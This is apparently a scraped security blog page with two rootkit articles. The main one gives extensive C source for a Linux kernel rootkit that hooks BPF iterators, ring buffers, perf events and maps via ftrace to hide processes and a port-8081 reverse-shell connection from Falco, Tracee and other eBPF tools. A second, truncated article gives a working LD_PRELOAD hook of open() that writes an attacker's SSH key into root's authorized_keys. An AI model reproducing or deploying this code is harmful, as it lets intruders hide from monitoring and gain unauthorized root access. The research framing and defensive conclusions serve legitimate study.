detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear “not found” without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques.\nBottom line: once the kernel is attacker-controlled, the system’s “ground truth” is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can’t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... 